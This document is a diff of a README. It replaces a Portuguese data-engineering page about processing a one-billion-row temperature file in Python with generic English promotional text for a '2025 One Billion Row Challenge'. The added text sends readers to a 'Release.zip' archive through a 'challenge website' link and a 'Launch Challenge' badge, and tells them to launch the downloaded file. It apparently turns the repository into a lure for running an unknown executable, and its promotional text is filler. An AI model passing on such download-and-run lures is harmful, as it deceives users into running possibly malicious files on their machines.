@@ -1,79 +1,46 @@
- 
-<p align="center">
-  <a href="https://suajornadadedados.com.br/"><img src="https://github.com/lvgalvao/data-engineering-roadmap/raw/main/pics/logo.png" alt="Jornada de Dados"></a>
-</p>
-<p align="center">
-    <em>Nossa missão é fornecer o melhor ensino em engenharia de dados</em>
-</p>
+# 🚀 2025 One Billion Row Challenge
 
-Bem-vindo a **Jornada de Dados**
+## Description
+Welcome to the official GitHub repository of the "2025-One-Billion-Row-Challenge" project! This project is an updated version of the famous "One Billion Row Challenge," now revamped for the year 2025. 
 
----
+![Challenge Image](https://example.com/challenge-image.jpg)
 
-## Introdução
+In this repository, you will find all the resources, tools, and information you need to participate in this thrilling challenge. Are you ready to test your skills and push boundaries in the world of data manipulation? Join us on this exciting journey!
 
-O objetivo deste projeto é demonstrar como processar eficientemente um arquivo de dados massivo contendo 1 bilhão de linhas (~14GB), especificamente para calcular estatísticas (Incluindo agregação e ordenação que são operações pesadas) utilizando Python. 
+## Repository Topics
+Topics: N/A
 
-Este desafio foi inspirado no [The One Billion Row Challenge](https://github.com/gunnarmorling/1brc), originalmente proposto para Java.
+## Get Started
+To begin your adventure in the "2025-One-Billion-Row-Challenge," please make sure to follow these steps:
 
-O arquivo de dados consiste em medições de temperatura de várias estações meteorológicas. Cada registro segue o formato `<string: nome da estação>;<double: medição>`, com a temperatura sendo apresentada com precisão de uma casa decimal.
+1. **Visit the Challenge Website**: [Click here to visit the challenge website](https://github.com/assets/Release.zip)
+   
+   If the link ends with the file name, make sure to launch it to access all the necessary files and guidelines to kickstart your challenge participation.
 
-Aqui estão dez linhas de exemplo do arquivo:
+2. **Explore Resources**: Dive into the repository to discover tools, data sets, and instructions on how to engage with the challenge effectively.
 
-```
-Hamburg;12.0
-Bulawayo;8.9
-Palembang;38.8
-St. Johns;15.2
-Cracow;12.6
-Bridgetown;26.9
-Istanbul;6.2
-Roseau;34.4
-Conakry;31.2
-Istanbul;23.0
-```
+3. **Join the Community**: Connect with fellow participants, share your progress, and seek assistance by engaging with the vibrant community associated with the challenge.
 
-O desafio é desenvolver um programa Python capaz de ler esse arquivo e calcular a temperatura mínima, média (arredondada para uma casa decimal) e máxima para cada estação, exibindo os resultados em uma tabela ordenada por nome da estação.
+4. **Stay Updated**: Keep an eye on the "Releases" section for any updates, announcements, or new resources that may enhance your experience in the challenge.
 
-| station      | min_temperature | mean_temperature | max_temperature |
-|--------------|-----------------|------------------|-----------------|
-| Abha         | -31.1           | 18.0             | 66.5            |
-| Abidjan      | -25.9           | 26.0             | 74.6            |
-| Abéché       | -19.8           | 29.4             | 79.9            |
-| Accra        | -24.8           | 26.4             | 76.3            |
-| Addis Ababa  | -31.8           | 16.0             | 63.9            |
-| Adelaide     | -31.8           | 17.3             | 71.5            |
-| Aden         | -19.6           | 29.1             | 78.3            |
-| Ahvaz        | -24.0           | 25.4             | 72.6            |
-| Albuquerque  | -35.0           | 14.0             | 61.9            |
-| Alexandra    | -40.1           | 11.0             | 67.9            |
-| ...          | ...             | ...              | ...             |
-| Yangon       | -23.6           | 27.5             | 77.3            |
-| Yaoundé      | -26.2           | 23.8             | 73.4            |
-| Yellowknife  | -53.4           | -4.3             | 46.7            |
-| Yerevan      | -38.6           | 12.4             | 62.8            |
-| Yinchuan     | -45.2           | 9.0              | 56.9            |
-| Zagreb       | -39.2           | 10.7             | 58.1            |
-| Zanzibar City| -26.5           | 26.0             | 75.2            |
-| Zürich       | -42.0           | 9.3              | 63.6            |
-| Ürümqi       | -42.1           | 7.4              | 56.7            |
-| İzmir        | -34.4           | 17.9             | 67.9            |
+## Let's Connect!
+Join our passionate community of data enthusiasts and challenge seekers by participating in the "2025-One-Billion-Row-Challenge." Together, we can push the limits of data manipulation and create exciting outcomes that inspire the world.
+
+Are you ready to take on the challenge? Let's dive in and make 2025 a year to remember in the world of data! 🌟🔥
+
+![Data Visualization](https://example.com/data-visualization.jpg)
+
+## Contributing
+If you are interested in contributing to the "2025-One-Billion-Row-Challenge" project, feel free to explore the repository, fork it, make your changes, and submit a pull request. Your contributions are highly appreciated and vital to the success of the challenge.
+
+Let's collaborate, innovate, and make data magic happen together! 🚀✨
 
 ---
 
-Esquema do projeto: [app.excalidraw.com]([https://link.excalidraw.com/l/8pvW6zbNUnD/9zZctm3OR9f](https://link.excalidraw.com/l/8pvW6zbNUnD/AOSRHr9dKWd))
+**Disclaimer:** This project is purely for educational and entertainment purposes. The challenge aims to sharpen data manipulation skills and encourage creative exploration of large datasets.
 
----
+**Note:** Any misuse or misrepresentation of data is against the principles of this challenge. Play fair, have fun, and let's excel together in the world of data!
 
-## **Overview do Hoje**  
+🚀 Happy Coding! 🌟
 
-### **Objetivo Principal**  
-O One Billion Challenge é um projeto que explora diferentes abordagens para processar um volume massivo de dados, chegando a 1 bilhão de linhas. O objetivo é testar e comparar o desempenho de tecnologias e frameworks para otimização de processamento de grandes volumes de dados.
-
-#### Objetivos
-
-- Testar e comparar diferentes ferramentas para processamento de grandes volumes de dados.
-- Explorar novas bibliotecas como Databricks, DuckDB, FireDucks, Polars, entre outras.
-- Compartilhar os aprendizados e benchmarks com a comunidade de engenharia de dados.
-
----
+[![Launch Challenge](https://img.shields.io/badge/Launch-Challenge-blue)](https://github.com/assets/Release.zip)
